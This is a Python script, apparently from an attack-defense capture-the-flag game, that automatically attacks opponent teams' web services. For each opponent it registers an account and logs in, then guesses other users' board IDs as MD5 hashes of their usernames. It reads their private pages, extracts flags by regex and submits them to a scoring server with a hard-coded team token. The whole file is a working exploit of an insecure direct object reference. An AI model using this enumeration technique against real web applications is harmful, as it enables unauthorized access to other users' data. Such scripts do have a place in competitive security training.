import requests
import hashlib
import json
import random
import string
import re

def submit_flags(payload):
    url = "http://11.11.0.1:8080/flags"
    print (requests.put(url, headers=header, json= payload).text)

my_ip = '11.0.1.1'
nop_ip = '11.0.0.1'
header = { "X-Team-Token": "f170afdc9ba017d7"}
flag_regex = re.compile(r"[A-Z0-9]{31}=")

opponents = requests.get("http://11.11.0.1:8080/api/client/attack_data").text
opponents = json.loads(opponents)
opponents = opponents['NapwnliFanBoard']
opponents.pop(my_ip)
opponents.pop(nop_ip)

for ip, usernames in opponents.items():
    try:
        payload = []
        data = {"username": ''.join(random.choices(string.digits,k=8)), "password": ''.join(random.choices(string.digits,k=8))}
        s = requests.Session()
        s.post(f"http://{ip}:5000/register", data=data)
        s.post(f"http://{ip}:5000/login", data=data)
        for user in usernames:
            umd5 = hashlib.md5(user.encode()).hexdigest()
            page = s.get(f"http://{ip}:5000/board?id={umd5}")
            flag = flag_regex.findall(page.text)[0]
            payload.append(flag)
        submit_flags(payload)
    except:
        print(f"Failed to exploit {ip}!!!")




